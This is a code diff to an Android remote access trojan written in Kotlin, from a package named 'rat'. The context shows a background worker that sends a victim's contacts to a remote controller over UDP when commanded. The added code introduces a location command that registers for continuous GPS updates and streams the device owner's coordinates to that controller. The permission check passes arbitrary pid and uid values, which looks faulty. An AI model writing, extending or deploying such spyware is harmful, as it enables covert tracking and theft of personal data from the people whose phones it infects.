@@ -1,6 +1,12 @@
 package ru.awawa.rat.worker
 
+import android.Manifest
 import android.content.Context
+import android.content.pm.PackageManager
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
+import android.location.LocationProvider
 import android.media.MediaPlayer
 import android.util.Log
 import androidx.work.Worker
@@ -99,6 +105,29 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
                 val contacts = ContactsHelper.getContacts(this.applicationContext)
                 val pckt = ContactsPacket(id, contacts)
                 this.socket.send(DatagramPacket(pckt.data, pckt.data.size, datagramPacket.address, datagramPacket.port))
+            }
+
+            MagicNumber.LOCATION -> {
+                val id = (packet as LocationPacket).id
+                if (id != this.state.id) return
+
+                val locationManager = applicationContext.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+                if (applicationContext.checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, 100, 101) == PackageManager.PERMISSION_GRANTED) {
+                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
+                            0L,
+                            0.0f
+                    )
+                    { location ->
+                        val pckt = LocationPacket(id,
+                                "Latitude ${location.latitude} Longitude: ${location.longitude}"
+                        )
+                        this@BackgroundWorker.socket.send(DatagramPacket(pckt.data,
+                                pckt.data.size,
+                                datagramPacket.address,
+                                datagramPacket.port
+                        ))
+                    }
+                }
             }
         }
     }
